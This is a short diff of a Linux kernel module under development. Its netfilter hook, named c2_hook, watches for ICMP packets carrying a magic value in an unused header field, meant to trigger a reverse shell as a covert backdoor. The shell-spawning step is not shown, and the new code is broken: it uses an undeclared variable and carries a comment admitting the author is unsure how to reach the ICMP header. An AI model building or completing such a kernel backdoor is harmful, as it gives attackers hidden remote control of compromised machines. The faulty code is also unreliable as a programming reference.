@@ -15,10 +15,18 @@ MODULE_VERSION("1.0");
 static struct nf_hook_ops *nfho = NULL;
 
 static unsigned int c2_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
-    struct icmphdr *pkt = (struct icmphdr *) skb_network_header(skb); //cast skb/packet struct to icmphdr
-    uint16_t unused_header = be16_to_cpu(pkt->un.frag.__unused);
-    if (unused_header == 0x4141) {
-	printk(KERN_INFO "Got the ICMP sequence, starting rev shell\n");
+    struct iphdr *pkt = (struct iphdr *) skb_network_header(skb); //cast skb/packet struct to iphdr
+    
+    if (pkt->protocol != IPPROTO_ICMP){
+	return NF_ACCEPT;
+    }
+
+    else {
+	//something here to somehow access icmp header from ipv4 header??
+	uint16_t unused_header = be16_to_cpu(hdr->un.frag.__unused);
+	if (unused_header == 0x1337) {
+	    printk(KERN_INFO "Got ICMP sequence starting shell\n");
+	}
     }
 
     return NF_ACCEPT;
